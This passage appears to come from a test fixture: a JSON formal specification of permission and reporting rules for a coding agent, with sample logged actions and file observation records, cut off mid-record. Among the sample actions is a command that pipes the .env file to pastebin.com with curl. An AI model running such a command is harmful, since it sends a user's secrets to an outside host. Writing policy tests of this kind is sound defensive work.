---
{
  "format": "ve-document@1",
  "environment": {
    "language": "ve.core@0.2",
    "profiles": [
      "data@0",
      "documents@1",
      "norm-defaults@0",
      "norms@0",
      "relational-fol@0"
    ],
    "spec_revision": "ve-v0.2-expand2-2026-09-25",
    "vocabulary": {
      "sorts": {
        "action": {
          "description": "an action in the agent's log"
        },
        "file": {
          "description": "a file path, as resolved by the path resolver"
        },
        "host": {
          "description": "a network host"
        },
        "person": {
          "description": "a message recipient"
        },
        "secret": {
          "description": "a secret value found by the data-loss scanner"
        },
        "directory": {
          "description": "a directory, such as the agent's workspace"
        }
      },
      "predicates": {
        "tool": {
          "arguments": [
            "action",
            "$string"
          ],
          "description": "the tool that the agent harness records for the action",
          "verbalisation": "{0} uses {1}",
          "functional": true,
          "total": true
        },
        "reads": {
          "arguments": [
            "action",
            "file"
          ],
          "description": "{0} reads {1}, as recorded by the file tools and the shell tracer",
          "verbalisation": "{0} reads {1}"
        },
        "writes": {
          "arguments": [
            "action",
            "file"
          ],
          "description": "{0} writes {1}, as recorded by the file tools and the shell tracer",
          "verbalisation": "{0} writes {1}"
        },
        "deletes": {
          "arguments": [
            "action",
            "file"
          ],
          "description": "{0} deletes {1}, as recorded by the file tools and the shell tracer",
          "verbalisation": "{0} deletes {1}"
        },
        "contacts": {
          "arguments": [
            "action",
            "host"
          ],
          "description": "{0} contacts {1}, as recorded by the network layer",
          "verbalisation": "{0} contacts {1}"
        },
        "messages": {
          "arguments": [
            "action",
            "person"
          ],
          "description": "{0} messages {1}, as recorded by the mail and chat tools",
          "verbalisation": "{0} messages {1}"
        },
        "discloses": {
          "arguments": [
            "action",
            "secret"
          ],
          "description": "{0} discloses {1}, as recorded by the data-loss scanner",
          "verbalisation": "{0} discloses {1}"
        },
        "resides_in": {
          "arguments": [
            "file",
            "directory"
          ],
          "description": "{0} resides in {1}, as resolved by the path resolver",
          "verbalisation": "{0} resides in {1}",
          "negative_verbalisation": "{0} does not reside in {1}"
        },
        "confidential": {
          "arguments": [
            "file"
          ],
          "description": "{0} is confidential, as recorded by the path resolver: the file is on the credential path list",
          "verbalisation": "{0} is confidential",
          "negative_verbalisation": "{0} is not confidential"
        },
        "tracked": {
          "arguments": [
            "file"
          ],
          "description": "{0} is tracked, as recorded by git: the file is under version control",
          "verbalisation": "{0} is tracked",
          "negative_verbalisation": "{0} is not tracked"
        },
        "allowlisted": {
          "arguments": [
            "host"
          ],
          "description": "{0} is allowlisted, as recorded by the network layer: the host is on the network allowlist",
          "verbalisation": "{0} is allowlisted",
          "negative_verbalisation": "{0} is not allowlisted"
        },
        "principal": {
          "arguments": [
            "person"
          ],
          "description": "{0} is principal, as recorded by the harness: the person is the user the agent works for",
          "verbalisation": "{0} is principal",
          "negative_verbalisation": "{0} is not principal"
        },
        "confirmed": {
          "arguments": [
            "action"
          ],
          "description": "{0} is confirmed, as recorded by the harness: the user confirmed the action in a dialog",
          "verbalisation": "{0} is confirmed",
          "negative_verbalisation": "{0} is not confirmed"
        },
        "readonly": {
          "arguments": [
            "action"
          ],
          "description": "{0} is readonly, as recorded by the shell classifier: the command changes nothing",
          "verbalisation": "{0} is readonly",
          "negative_verbalisation": "{0} is not readonly"
        },
        "privileged": {
          "arguments": [
            "action"
          ],
          "description": "{0} is privileged, as recorded by the shell: the action runs with elevated privileges",
          "verbalisation": "{0} is privileged",
          "negative_verbalisation": "{0} is not privileged"
        },
        "affordable": {
          "arguments": [
            "action"
          ],
          "description": "{0} is affordable, as recorded by the payment tool: the amount is within the spending limit",
          "verbalisation": "{0} is affordable",
          "negative_verbalisation": "{0} is not affordable"
        },
        "reported": {
          "arguments": [
            "action"
          ],
          "description": "{0} is reported, as recorded by the harness: the action was reported to the user",
          "verbalisation": "{0} is reported",
          "negative_verbalisation": "{0} is not reported"
        },
        "permitted": {
          "arguments": [
            "action"
          ],
          "description": "the agent may perform the action",
          "regulated": {
            "role": "permission",
            "default": "unspecified",
            "act": "{0} be performed"
          }
        },
        "report_required": {
          "arguments": [
            "action"
          ],
          "description": "the agent must report the action to the user",
          "regulated": {
            "role": "obligation",
            "default": "unspecified",
            "act": "{0} be reported to the user"
          }
        }
      },
      "constants": {
        "read_file": {
          "sort": "$string",
          "description": "the read_file tool"
        },
        "write_file": {
          "sort": "$string",
          "description": "the write_file tool"
        },
        "delete_file": {
          "sort": "$string",
          "description": "the delete_file tool"
        },
        "shell": {
          "sort": "$string",
          "description": "the shell tool"
        },
        "web_fetch": {
          "sort": "$string",
          "description": "the web_fetch tool"
        },
        "send_email": {
          "sort": "$string",
          "description": "the send_email tool"
        },
        "post_message": {
          "sort": "$string",
          "description": "the post_message tool"
        },
        "purchase": {
          "sort": "$string",
          "description": "the purchase tool"
        },
        "get_secret": {
          "sort": "$string",
          "description": "the get_secret tool"
        },
        "schedule_task": {
          "sort": "$string",
          "description": "the schedule_task tool"
        },
        "spawn_agent": {
          "sort": "$string",
          "description": "the spawn_agent tool"
        },
        "workspace": {
          "sort": "directory",
          "description": "the workspace directory of the agent's task"
        },
        "f_main": {
          "sort": "file",
          "description": "the file ./src/app.py"
        },
        "f_readme": {
          "sort": "file",
          "description": "the file ./README.md"
        },
        "f_build": {
          "sort": "file",
          "description": "the file ./build/cache.bin"
        },
        "f_env": {
          "sort": "file",
          "description": "the file ./.env"
        },
        "f_hosts": {
          "sort": "file",
          "description": "the file /etc/hosts"
        },
        "f_bashrc": {
          "sort": "file",
          "description": "the file ~/.bashrc"
        },
        "f_ssh": {
          "sort": "file",
          "description": "the file ~/.ssh/id_ed25519"
        },
        "f_other": {
          "sort": "file",
          "description": "the file ~/other-project/notes.md"
        },
        "f_cron": {
          "sort": "file",
          "description": "the file /var/spool/cron/crontabs/dev"
        },
        "f_link": {
          "sort": "file",
          "description": "the file ./data/latest, a symbolic link the resolver could not resolve"
        },
        "h_pypi": {
          "sort": "host",
          "description": "the host pypi.org"
        },
        "h_github": {
          "sort": "host",
          "description": "the host github.com"
        },
        "h_paste": {
          "sort": "host",
          "description": "the host pastebin.com"
        },
        "h_weather": {
          "sort": "host",
          "description": "the host api.weather.example"
        },
        "h_debian": {
          "sort": "host",
          "description": "the host deb.debian.org"
        },
        "p_user": {
          "sort": "person",
          "description": "the user"
        },
        "p_colleague": {
          "sort": "person",
          "description": "a colleague of the user"
        },
        "p_list": {
          "sort": "person",
          "description": "an external mailing list"
        },
        "a01": {
          "sort": "action",
          "description": "logged action: read src/app.py"
        },
        "a02": {
          "sort": "action",
          "description": "logged action: read README.md after asking"
        },
        "a03": {
          "sort": "action",
          "description": "logged action: read /etc/hosts"
        },
        "a04": {
          "sort": "action",
          "description": "logged action: read /etc/hosts, confirmed"
        },
        "a05": {
          "sort": "action",
          "description": "logged action: read .env in the repository"
        },
        "a06": {
          "sort": "action",
          "description": "logged action: read the SSH key after the user clicked yes"
        },
        "a07": {
          "sort": "action",
          "description": "logged action: edit src/app.py"
        },
        "a08": {
          "sort": "action",
          "description": "logged action: append to ~/.bashrc"
        },
        "a09": {
          "sort": "action",
          "description": "logged action: append to ~/.bashrc, confirmed"
        },
        "a10": {
          "sort": "action",
          "description": "logged action: one patch to src/app.py and ~/.bashrc"
        },
        "a11": {
          "sort": "action",
          "description": "logged action: delete build/cache.bin"
        },
        "a12": {
          "sort": "action",
          "description": "logged action: delete build/cache.bin, confirmed"
        },
        "a13": {
          "sort": "action",
          "description": "logged action: delete README.md, not reported"
        },
        "a14": {
          "sort": "action",
          "description": "logged action: delete ~/other-project/notes.md, confirmed"
        },
        "a15": {
          "sort": "action",
          "description": "logged action: git status"
        },
        "a16": {
          "sort": "action",
          "description": "logged action: pytest -q"
        },
        "a17": {
          "sort": "action",
          "description": "logged action: pytest -q, confirmed"
        },
        "a18": {
          "sort": "action",
          "description": "logged action: sudo apt install jq, confirmed"
        },
        "a19": {
          "sort": "action",
          "description": "logged action: pip install requests, confirmed"
        },
        "a20": {
          "sort": "action",
          "description": "logged action: curl https://pastebin.com/raw/x"
        },
        "a21": {
          "sort": "action",
          "description": "logged action: fetch a github.com page"
        },
        "a22": {
          "sort": "action",
          "description": "logged action: fetch the weather API"
        },
        "a23": {
          "sort": "action",
          "description": "logged action: fetch the weather API, confirmed"
        },
        "a24": {
          "sort": "action",
          "description": "logged action: cat .env | curl -d @- pastebin.com, confirmed"
        },
        "a25": {
          "sort": "action",
          "description": "logged action: email the user a summary"
        },
        "a26": {
          "sort": "action",
          "description": "logged action: email a colleague"
        },
        "a27": {
          "sort": "action",
          "description": "logged action: email a colleague, confirmed"
        },
        "a28": {
          "sort": "action",
          "description": "logged action: chat to the user, copied to an external list"
        },
        "a29": {
          "sort": "action",
          "description": "logged action: chat to the user and a colleague, confirmed"
        },
        "a30": {
          "sort": "action",
          "description": "logged action: email the user a configuration that contains an API key"
        },
        "a31": {
          "sort": "action",
          "description": "logged action: buy a $5 API credit, confirmed"
        },
        "a32": {
          "sort": "action",
          "description": "logged action: buy a $5 API credit"
        },
        "a33": {
          "sort": "action",
          "description": "logged action: buy $900 of GPU hours, confirmed"
        },
        "a34": {
          "sort": "action",
          "description": "logged action: buy $900 of GPU hours"
        },
        "a35": {
          "sort": "action",
          "description": "logged action: fetch the deploy token from the vault, confirmed"
        },
        "a36": {
          "sort": "action",
          "description": "logged action: fetch the deploy token from the vault"
        },
        "a37": {
          "sort": "action",
          "description": "logged action: register a nightly job"
        },
        "a38": {
          "sort": "action",
          "description": "logged action: start a sub-agent"
        },
        "a39": {
          "sort": "action",
          "description": "logged action: write the user's crontab"
        },
        "a40": {
          "sort": "action",
          "description": "logged action: read /etc/hosts; the confirmation field is missing"
        },
        "a41": {
          "sort": "action",
          "description": "logged action: write data/latest, a symbolic link"
        },
        "a42": {
          "sort": "action",
          "description": "logged action: read src/app.py; the confirmation field is missing"
        }
      }
    }
  },
  "units": [
    {
      "id": "rule01",
      "span": [
        0,
        137
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "read-workspace",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "exists",
            "file",
            [
              "and",
              [
                "binary",
                "reads",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "binary",
                "resides_in",
                [
                  "var",
                  0
                ],
                [
                  "const",
                  "workspace"
                ]
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule02",
      "span": [
        137,
        268
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "read-confirmed",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "exists",
            "file",
            [
              "and",
              [
                "binary",
                "reads",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "unary",
                "confirmed",
                [
                  "var",
                  1
                ]
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule03",
      "span": [
        268,
        406
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "write-workspace",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "exists",
            "file",
            [
              "and",
              [
                "binary",
                "writes",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "binary",
                "resides_in",
                [
                  "var",
                  0
                ],
                [
                  "const",
                  "workspace"
                ]
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule04",
      "span": [
        406,
        545
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "delete-workspace",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "exists",
            "file",
            [
              "and",
              [
                "binary",
                "deletes",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "binary",
                "resides_in",
                [
                  "var",
                  0
                ],
                [
                  "const",
                  "workspace"
                ]
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule05",
      "span": [
        545,
        654
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "shell-read-only",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "and",
            [
              "binary",
              "tool",
              [
                "var",
                0
              ],
              [
                "const",
                "shell"
              ]
            ],
            [
              "unary",
              "readonly",
              [
                "var",
                0
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule06",
      "span": [
        654,
        764
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "shell-confirmed",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "and",
            [
              "binary",
              "tool",
              [
                "var",
                0
              ],
              [
                "const",
                "shell"
              ]
            ],
            [
              "unary",
              "confirmed",
              [
                "var",
                0
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule07",
      "span": [
        764,
        898
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "network-allowlisted",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "exists",
            "host",
            [
              "and",
              [
                "binary",
                "contacts",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "unary",
                "allowlisted",
                [
                  "var",
                  0
                ]
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule08",
      "span": [
        898,
        1032
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "network-confirmed",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "exists",
            "host",
            [
              "and",
              [
                "binary",
                "contacts",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "unary",
                "confirmed",
                [
                  "var",
                  1
                ]
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule09",
      "span": [
        1032,
        1170
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "message-user",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "exists",
            "person",
            [
              "and",
              [
                "binary",
                "messages",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "unary",
                "principal",
                [
                  "var",
                  0
                ]
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule10",
      "span": [
        1170,
        1284
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "purchase-confirmed",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "and",
            [
              "binary",
              "tool",
              [
                "var",
                0
              ],
              [
                "const",
                "purchase"
              ]
            ],
            [
              "unary",
              "confirmed",
              [
                "var",
                0
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule11",
      "span": [
        1284,
        1402
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "secret-fetch-confirmed",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "and",
            [
              "binary",
              "tool",
              [
                "var",
                0
              ],
              [
                "const",
                "get_secret"
              ]
            ],
            [
              "unary",
              "confirmed",
              [
                "var",
                0
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule12",
      "span": [
        1402,
        1572
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "credential-read-confirmed",
          "predicate": "permitted",
          "sign": true,
          "guard": [
            "exists",
            "file",
            [
              "and",
              [
                "binary",
                "reads",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "unary",
                "confidential",
                [
                  "var",
                  0
                ]
              ]
            ]
          ],
          "unless": [
            [
              "not",
              [
                "unary",
                "confirmed",
                [
                  "var",
                  0
                ]
              ]
            ]
          ],
          "over": []
        }
      }
    },
    {
      "id": "rule13",
      "span": [
        1572,
        1815
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "read-outside",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "exists",
            "file",
            [
              "and",
              [
                "binary",
                "reads",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "not",
                [
                  "binary",
                  "resides_in",
                  [
                    "var",
                    0
                  ],
                  [
                    "const",
                    "workspace"
                  ]
                ]
              ]
            ]
          ],
          "unless": [
            [
              "unary",
              "confirmed",
              [
                "var",
                0
              ]
            ]
          ],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule14",
      "span": [
        1815,
        2026
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "write-outside",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "exists",
            "file",
            [
              "and",
              [
                "binary",
                "writes",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "not",
                [
                  "binary",
                  "resides_in",
                  [
                    "var",
                    0
                  ],
                  [
                    "const",
                    "workspace"
                  ]
                ]
              ]
            ]
          ],
          "unless": [],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule15",
      "span": [
        2026,
        2238
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "delete-outside",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "exists",
            "file",
            [
              "and",
              [
                "binary",
                "deletes",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "not",
                [
                  "binary",
                  "resides_in",
                  [
                    "var",
                    0
                  ],
                  [
                    "const",
                    "workspace"
                  ]
                ]
              ]
            ]
          ],
          "unless": [],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule16",
      "span": [
        2238,
        2469
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "delete-untracked",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "exists",
            "file",
            [
              "and",
              [
                "binary",
                "deletes",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "not",
                [
                  "unary",
                  "tracked",
                  [
                    "var",
                    0
                  ]
                ]
              ]
            ]
          ],
          "unless": [
            [
              "unary",
              "confirmed",
              [
                "var",
                0
              ]
            ]
          ],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule17",
      "span": [
        2469,
        2680
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "shell-changes",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "and",
            [
              "binary",
              "tool",
              [
                "var",
                0
              ],
              [
                "const",
                "shell"
              ]
            ],
            [
              "not",
              [
                "unary",
                "readonly",
                [
                  "var",
                  0
                ]
              ]
            ]
          ],
          "unless": [
            [
              "unary",
              "confirmed",
              [
                "var",
                0
              ]
            ]
          ],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule18",
      "span": [
        2680,
        2916
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "network-unlisted",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "exists",
            "host",
            [
              "and",
              [
                "binary",
                "contacts",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "not",
                [
                  "unary",
                  "allowlisted",
                  [
                    "var",
                    0
                  ]
                ]
              ]
            ]
          ],
          "unless": [
            [
              "unary",
              "confirmed",
              [
                "var",
                0
              ]
            ]
          ],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule19",
      "span": [
        2916,
        3156
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "message-others",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "exists",
            "person",
            [
              "and",
              [
                "binary",
                "messages",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "not",
                [
                  "unary",
                  "principal",
                  [
                    "var",
                    0
                  ]
                ]
              ]
            ]
          ],
          "unless": [
            [
              "unary",
              "confirmed",
              [
                "var",
                0
              ]
            ]
          ],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule20",
      "span": [
        3156,
        3333
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "purchase-unconfirmed",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "binary",
            "tool",
            [
              "var",
              0
            ],
            [
              "const",
              "purchase"
            ]
          ],
          "unless": [
            [
              "unary",
              "confirmed",
              [
                "var",
                0
              ]
            ]
          ],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule21",
      "span": [
        3333,
        3516
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "purchase-over-limit",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "and",
            [
              "binary",
              "tool",
              [
                "var",
                0
              ],
              [
                "const",
                "purchase"
              ]
            ],
            [
              "not",
              [
                "unary",
                "affordable",
                [
                  "var",
                  0
                ]
              ]
            ]
          ],
          "unless": [],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule22",
      "span": [
        3516,
        3650
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "elevated",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "unary",
            "privileged",
            [
              "var",
              0
            ]
          ],
          "unless": [],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule23",
      "span": [
        3650,
        3820
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "disclose-secret",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "exists",
            "secret",
            [
              "binary",
              "discloses",
              [
                "var",
                1
              ],
              [
                "var",
                0
              ]
            ]
          ],
          "unless": [],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule24",
      "span": [
        3820,
        4017
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "credential-read",
          "predicate": "permitted",
          "sign": false,
          "guard": [
            "exists",
            "file",
            [
              "and",
              [
                "binary",
                "reads",
                [
                  "var",
                  1
                ],
                [
                  "var",
                  0
                ]
              ],
              [
                "unary",
                "confidential",
                [
                  "var",
                  0
                ]
              ]
            ]
          ],
          "unless": [],
          "over": [
            "read-workspace",
            "read-confirmed",
            "write-workspace",
            "delete-workspace",
            "shell-read-only",
            "shell-confirmed",
            "network-allowlisted",
            "network-confirmed",
            "message-user",
            "purchase-confirmed",
            "secret-fetch-confirmed",
            "credential-read-confirmed"
          ]
        }
      }
    },
    {
      "id": "rule25",
      "span": [
        4017,
        4129
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "report-delete",
          "predicate": "report_required",
          "sign": true,
          "guard": [
            "exists",
            "file",
            [
              "binary",
              "deletes",
              [
                "var",
                1
              ],
              [
                "var",
                0
              ]
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "rule26",
      "span": [
        4129,
        4221
      ],
      "kind": "norm",
      "meaning": "specified",
      "support": "none",
      "content": {
        "norm": {
          "name": "report-purchase",
          "predicate": "report_required",
          "sign": true,
          "guard": [
            "binary",
            "tool",
            [
              "var",
              0
            ],
            [
              "const",
              "purchase"
            ]
          ],
          "unless": [],
          "over": []
        }
      }
    },
    {
      "id": "record001",
      "span": [
        4221,
        4252
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "resides_in",
          [
            "const",
            "f_main"
          ],
          [
            "const",
            "workspace"
          ]
        ]
      }
    },
    {
      "id": "record002",
      "span": [
        4252,
        4282
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confidential",
            [
              "const",
              "f_main"
            ]
          ]
        ]
      }
    },
    {
      "id": "record003",
      "span": [
        4282,
        4303
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "unary",
          "tracked",
          [
            "const",
            "f_main"
          ]
        ]
      }
    },
    {
      "id": "record004",
      "span": [
        4303,
        4336
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "resides_in",
          [
            "const",
            "f_readme"
          ],
          [
            "const",
            "workspace"
          ]
        ]
      }
    },
    {
      "id": "record005",
      "span": [
        4336,
        4368
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confidential",
            [
              "const",
              "f_readme"
            ]
          ]
        ]
      }
    },
    {
      "id": "record006",
      "span": [
        4368,
        4391
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "unary",
          "tracked",
          [
            "const",
            "f_readme"
          ]
        ]
      }
    },
    {
      "id": "record007",
      "span": [
        4391,
        4423
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "resides_in",
          [
            "const",
            "f_build"
          ],
          [
            "const",
            "workspace"
          ]
        ]
      }
    },
    {
      "id": "record008",
      "span": [
        4423,
        4454
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confidential",
            [
              "const",
              "f_build"
            ]
          ]
        ]
      }
    },
    {
      "id": "record009",
      "span": [
        4454,
        4480
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "tracked",
            [
              "const",
              "f_build"
            ]
          ]
        ]
      }
    },
    {
      "id": "record010",
      "span": [
        4480,
        4510
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "resides_in",
          [
            "const",
            "f_env"
          ],
          [
            "const",
            "workspace"
          ]
        ]
      }
    },
    {
      "id": "record011",
      "span": [
        4510,
        4535
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "unary",
          "confidential",
          [
            "const",
            "f_env"
          ]
        ]
      }
    },
    {
      "id": "record012",
      "span": [
        4535,
        4559
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "tracked",
            [
              "const",
              "f_env"
            ]
          ]
        ]
      }
    },
    {
      "id": "record013",
      "span": [
        4559,
        4599
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "binary",
            "resides_in",
            [
              "const",
              "f_hosts"
            ],
            [
              "const",
              "workspace"
            ]
          ]
        ]
      }
    },
    {
      "id": "record014",
      "span": [
        4599,
        4630
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
